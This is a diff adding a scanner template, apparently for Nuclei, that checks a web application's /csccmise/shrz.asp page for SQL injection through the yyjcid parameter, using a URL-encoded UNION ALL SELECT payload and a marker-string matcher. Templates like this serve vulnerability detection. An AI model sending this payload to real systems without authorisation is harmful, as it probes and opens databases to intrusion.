@@ -1,0 +1,25 @@
+id: inc-csccmise-shrz-sqli
+info:
+  name: inc-csccmise-shrz-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /csccmise/shrz.asp?yyjcid=123%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20dzIF HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - qzxzq1qkzjq
+    matchers-condition: and
